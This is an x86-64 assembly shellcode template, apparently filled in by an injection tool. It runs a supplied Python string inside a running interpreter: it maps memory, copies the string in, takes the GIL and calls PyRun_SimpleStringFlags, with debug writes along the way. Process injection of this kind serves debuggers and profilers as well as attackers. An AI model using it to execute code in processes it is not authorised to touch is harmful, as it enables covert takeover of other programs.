	# // BEGIN: call Py_Initialize()
	# push r14
	# mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Initialize:RELATIVEOFFSET]
	# pop r14
	# // END: call Py_Initialize()
	
	// BEGIN: Allocate a block of read/write memory and copy the Python string there
	push r14
	push r13
	// allocate a new block of memory for read/write data using mmap
	mov rax, 9              								# SYS_MMAP
	xor rdi, rdi            								# start address
	mov rsi, 0x10000								  		# len
	mov rdx, 0x3            								# prot (rw)
	mov r10, 0x22           								# flags (MAP_PRIVATE | MAP_ANONYMOUS)
	mov r8, -1             									# fd
	xor r9, r9              								# offset 0
	syscall
	mov r11, rax            								# save mmap addr
	pop r13
	pop r14
	
	// copy the Python string to the new block
	push r14
	push r13
	push r11
	mov rdi, r11
	lea rsi, python_code[rip]
	mov rcx, [VARIABLE:pythoncode.length:VARIABLE]
	add rcx, 2												# null terminator
	rep movsb
	pop r11
	pop r13
	pop r14
	// END: Allocate a block of read/write memory and copy the Python string there
	
	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	push r14
	push r13
	push r11
	xor rax, rax
	//mov rdi, 0
	//mov rsi, 0
	movabsq rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
	call rbx
	mov r13, rax
	// END: call PyGILState_Ensure()
	
	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")

	mov rsi, 0
	// set RDI to the location of the string
	mov rdi, r11
	// allocate stack variable and use it to store the address of the code
	sub rsp, 8
	mov [rsp], rdi
	push rdi
	//set RAX to the Python GILState handle
	mov rax, r13
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyRun_SimpleStringFlags:RELATIVEOFFSET]
	call rbx
	//pop rdi
	// discard stack variable
	add rsp, 8

	pop r11
	pop r13
	pop r14
	// END: call PyRun_SimpleString("arbitrary Python code here")

	//debug
	push r14
	push r13
	push r11
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 5 #from buffer
	syscall
	pop r11
	pop r13
	pop r14
	///debug
	
	// de-allocate the mmapped block
	push r14
	push r13
	push r11
	mov rax, 11              								# SYS_MUNMAP
	mov rdi, r11           									# start address
	mov rsi, 0x10000								  		# len
	syscall
	pop r11
	pop r13
	pop r14
	
	//debug
	push r14
	push r13
	push r11
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 6 #from buffer
	syscall
	pop r11
	pop r13
	pop r14
	///debug
	
	// BEGIN: call PyGILState_Release(handle)
	push r14
	push r13
	push r11
	mov rax, r13
	mov rdi, rax
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Release:RELATIVEOFFSET]
	call rbx
	pop r11
	pop r13
	pop r14
	// END: call PyGILState_Release(handle)

	//debug
	push r14
	push r13
	push r11
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 7 #from buffer
	syscall
	pop r11
	pop r13
	pop r14
	///debug
	
	# // BEGIN: call Py_Finalize()
	# push r14
	# push r13
	# push r11
	# push rax
	# push rbx
	# mov rax, 0
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Finalize:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# pop rax
	# pop r11
	# pop r13
	# pop r14
	# // END: call Py_Finalize()

	//debug
	push r14
	push r13
	push r11
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 8 #from buffer
	syscall
	pop r11
	pop r13
	pop r14
	///debug
	
	

BEGIN_SHELLCODE_DATA

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"

dmsg:
	.ascii "ZYXWVUTSRQPONMLKJIHG\0"
